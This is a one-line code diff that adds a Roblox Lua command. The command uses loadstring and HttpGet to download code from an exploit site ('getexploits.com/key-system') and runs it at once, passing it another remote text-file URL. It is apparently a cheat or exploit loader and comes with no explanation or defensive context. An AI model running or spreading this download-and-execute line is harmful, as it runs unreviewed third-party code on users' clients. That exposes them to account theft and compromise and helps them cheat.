@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://getexploits.com/key-system/',true))('https://da.com/936752244018249768/1000179125258039376/New_Text_Document.txt')
